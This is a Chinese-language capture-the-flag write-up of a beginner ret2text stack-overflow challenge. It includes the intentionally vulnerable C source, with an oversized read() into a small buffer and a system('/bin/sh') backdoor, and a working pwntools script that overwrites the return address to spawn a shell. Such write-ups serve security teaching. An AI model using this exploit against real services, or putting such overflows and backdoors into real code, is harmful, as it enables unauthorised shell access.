# week1帮我取一个题目名称

## 题目简述

程序是 64 位、无 PIE 的 ret2text 栈溢出题。`func` 只为 `buf` 分配了 `0x20` 字节，却调用 `read(0, buf, 0x40)` 读入最多 `0x40` 字节；程序内还保留了调用 `/bin/sh` 的 `shell` 函数，因此只需覆盖返回地址，无须注入 shellcode。

```c
void shell()
{
    puts("[*] GetShell");
    system("/bin/sh");
}

void func()
{
    char buf[0x20];
    memset(buf, 0, sizeof(buf));
    puts("Welcome 0xGame,Leave U2 Name?");
    read(0, buf, 0x40);
}
```

## 解题过程

从 `buf` 起始位置到保存的返回地址共有 `0x20 + 0x8 = 0x28` 字节，其中额外的 `0x8` 字节是保存的 `rbp`。官方二进制未启用 PIE，反汇编可得 `shell` 地址为 `0x401162`，该地址在远程进程中保持不变。

构造 `0x28` 字节填充，再把返回地址改为 `shell`：

```python
from pwn import *

context.binary = "./main"
context.arch = "amd64"


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(context.binary.path)


io = start()
shell = 0x401162
payload = b"A" * 0x28 + p64(shell)

io.sendafter(b"?", payload)
io.interactive()
```

本地调试直接运行脚本；连接题目时传入 `REMOTE HOST=<主机> PORT=<端口>`。成功返回 `shell` 后即可读取 flag。

## 方法总结

- 核心技巧：利用栈溢出把返回地址改为程序内已有的后门函数。
- 识别信号：小缓冲区配合更大长度的 `read`，同时存在 `system("/bin/sh")`。
- 复用要点：偏移应由栈帧或 cyclic 调试确认；只有未启用 PIE 时，代码地址才能直接硬编码。
